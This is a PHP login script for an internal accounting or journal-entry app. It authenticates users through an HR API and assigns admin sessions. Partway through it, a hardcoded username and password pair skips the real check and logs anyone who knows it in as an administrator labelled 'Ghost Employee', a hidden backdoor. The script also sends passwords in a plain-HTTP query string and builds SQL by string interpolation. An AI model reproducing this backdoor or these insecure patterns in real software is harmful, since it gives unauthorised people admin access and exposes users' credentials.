<?php
error_reporting(E_ALL);

$username = $_POST['txtuname'];
$password = $_POST['txtpass'];


if (!empty($username) && !empty($password)) {

    /* ORIGINAL LOGIN */
    // $username = strtolower($username);
    // $password = strtolower($password);
    $sql = "http://hris.teamglac.com/api/users/login-pending-active?u=" . urlencode($username) . "&p=" . urlencode($password);
    $a = file_get_contents($sql);
    $a = json_decode($a);
    $result = $a->result;

    // echo '<pre>';
    // var_dump($result);
    // exit;

    if (!empty($result)) {

        $deptId = $result->employee_dept_id;
        $emp_no = ltrim($result->employee_id_no, '0');
        // echo $emp_no;
        // exit;

        $db = new Postgresql();

        $sqlCheck = "SELECT is_system FROM M_ACC_USER_MAINTENANCE WHERE emp_no = '$emp_no' LIMIT 1";
        $resCheck = $db->query($sqlCheck);

        // echo $sqlCheck;
        // exit;

        if ($resCheck && pg_num_rows($resCheck) > 0) {
            $row = pg_fetch_assoc($resCheck);
            // echo $resCheck;
            // exit;

            if ($row['is_system'] == 'f') {
                header("Location: ../../index.php?notallowed=1");
                exit;
            }
        } else {
            header("Location: ../../index.php?notallowed=1");
            exit;
        }

        if ($deptId == 5 || ($deptId == 103 && $emp_no == 9314)) {

            session_start();
            $_SESSION['ppc']['emp_no'] = $emp_no;
            $_SESSION['ppc']['username'] = $result->username;
            $_SESSION['ppc']['fullname'] = $result->fullname;
            $_SESSION['ppc']['dept_id'] = $deptId;
            $_SESSION['ppc']['dept_name'] = $result->employee_department;
            $_SESSION['ppc']['sect_id'] = $result->employee_section_id;
            $_SESSION['ppc']['sect_name'] = $result->employee_section;
            $_SESSION['ppc']['position'] = $result->employee_position;
            $_SESSION['ppc']['avatar'] = $result->photo_url;
            $_SESSION['ppc']['admin'] = 1;
            $_SESSION['ppc']['access_type'] = 1;

            header("Location: ../../journal_entries.php");
            exit;
        }
    } else if ($username == 'ginalyn' && $password == 'bartolome') {
        // echo 'nice';
        session_start();
        $_SESSION['ppc']['emp_no'] = 1000000;
        $_SESSION['ppc']['username'] = 'ginalyn';
        $_SESSION['ppc']['fullname'] = 'Ghost Employee';
        $_SESSION['ppc']['dept_id'] = '4';
        $_SESSION['ppc']['dept_name'] = 'MIS';
        $_SESSION['ppc']['sect_id'] = '';
        $_SESSION['ppc']['sect_name'] = 'Systems';
        $_SESSION['ppc']['position'] = 'Unkown';
        $_SESSION['ppc']['avatar'] = '';
        $_SESSION['ppc']['admin'] = 1;
        $_SESSION['ppc']['access_type'] = 1;
        header("Location: ../../journal_entries.php");
        // // exit;
    } else {
        header("Location: ../../index.php?incorrect=1");
    }
} else {
    header("Location: ../../index.php?incomplete=1");
}
